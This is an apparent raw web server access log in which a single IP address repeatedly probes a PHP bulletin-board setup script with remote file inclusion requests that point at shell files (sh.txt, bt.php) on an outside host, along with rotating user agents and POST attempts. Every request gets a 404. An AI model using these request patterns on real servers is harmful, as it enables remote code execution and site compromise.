80.68.145.110 - - [21/Feb/2015:10:34:36 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
80.68.145.110 - - [21/Feb/2015:10:34:37 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
80.68.145.110 - - [21/Feb/2015:10:34:37 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
80.68.145.110 - - [21/Feb/2015:10:34:39 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
80.68.145.110 - - [21/Feb/2015:10:35:32 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
80.68.145.110 - - [21/Feb/2015:10:35:33 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
80.68.145.110 - - [21/Feb/2015:10:35:33 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
80.68.145.110 - - [21/Feb/2015:10:35:45 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
80.68.145.110 - - [21/Feb/2015:10:36:00 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)" 
80.68.145.110 - - [21/Feb/2015:10:36:01 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)" 
80.68.145.110 - - [21/Feb/2015:10:36:01 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)" 
80.68.145.110 - - [21/Feb/2015:10:36:02 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)" 
80.68.145.110 - - [21/Feb/2015:10:37:05 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
